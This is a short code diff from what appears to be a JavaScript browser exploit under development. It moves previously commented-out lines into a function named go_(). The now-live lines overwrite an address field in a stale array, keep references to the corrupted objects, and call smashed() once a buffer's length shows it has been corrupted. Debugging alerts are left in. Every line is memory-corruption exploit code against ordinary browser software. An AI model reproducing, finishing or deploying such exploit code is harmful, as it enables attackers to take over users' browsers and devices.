@@ -210,24 +210,25 @@ function go_() {
 				
 				// Adding new code here
 				bck = stale[0][4];
+				stale[0][4] = 0; // address, low 32 bits
+				mem0 = stale[0];
+ 				mem1 = bck;
+ 				mem2 = smsh;
+ 				bufs.push(stale)
 				
+ 				if (smsh.length != 0x10) {
+ 					smashed(stale[0]);
+ 				}
 				alert("3");
 				//alert("4");
 				
 				// Uncommenting this block comment breaks everything.
 				/*
 				
- 				stale[0][4] = 0; // address, low 32 bits
+ 				
  				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
  				
- 				mem0 = stale[0];
- 				mem1 = bck;
- 				mem2 = smsh;
- 				//bufs.push(stale)
-				
- 				if (smsh.length != 0x10) {
- 					smashed(stale[0]);
- 				}
+
 				*/
 				
 				return;
